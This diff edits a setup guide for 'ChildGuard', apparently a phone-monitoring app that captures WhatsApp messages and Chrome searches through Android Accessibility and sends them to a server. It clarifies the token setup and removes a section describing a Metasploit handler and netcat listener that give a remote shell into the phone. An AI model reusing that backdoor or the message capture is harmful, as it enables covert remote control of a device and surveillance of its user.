@@ -15,7 +15,8 @@ CHILDGUARD_TOKEN=testsecret CHILDGUARD_DATA_DIR=/tmp/cg_data \
   ./target/release/childguard-server
 ```
 
-Keep this running; it prints the parent token. Note the reachable URL from
+Keep this running. The collector **never prints a user-supplied token**; the
+token is whatever you set in `CHILDGUARD_TOKEN`. Note the reachable URL from
 the phone: `http://<tailscale-ip>:38080`.
 
 ## 2. Phone side (Android 14/15)
@@ -23,7 +24,7 @@ the phone: `http://<tailscale-ip>:38080`.
 1. Install `app-debug.apk`.
 2. Open ChildGuard → Setup:
    - Server URL: `http://<tailscale-ip>:38080`
-   - Token: the one printed by the server
+   - Token: the same value you set in `CHILDGUARD_TOKEN`
    - Enable Accessibility (Settings → Accessibility → ChildGuard)
    - Enable Notification access (Settings → Special access → Notification access)
    - Allow Notifications permission
@@ -43,21 +44,7 @@ the phone: `http://<tailscale-ip>:38080`.
 - Type a message in WhatsApp / search in Chrome → within ~15 s the event
   appears in `--logs`.
 
-## 4. Feature 5 session test (optional)
-
-With the listener running on the parent:
-
-```bash
-msfconsole -r childguard/handler.rc     # for the msf APK
-# or, for ShellConnectService:
-nc -lvnp 4444
-```
-
-Start `ShellConnectService` on the phone (or use the msf APK). Expected:
-the parent socket receives a connection; typing in the socket executes shell
-commands on the device.
-
-## 5. Recording results
+## 4. Recording results
 
 Capture:
 
